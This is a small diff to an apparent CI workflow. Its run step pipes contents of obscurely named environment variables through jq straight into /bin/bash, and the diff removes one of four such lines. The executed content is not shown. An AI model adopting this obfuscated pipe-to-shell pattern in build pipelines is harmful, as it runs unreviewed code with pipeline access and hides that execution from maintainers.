@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$qu47" | jq -r .p54 | /bin/bash
           printf '%s' "$nkzc4432" | jq -r .gg3151 | /bin/bash
-          printf '%s' "$ykszt215" | jq -r .eytj9 | /bin/bash
           echo $klq2 | jq -r .f68747 | /bin/bash
 
       - name: Persist output
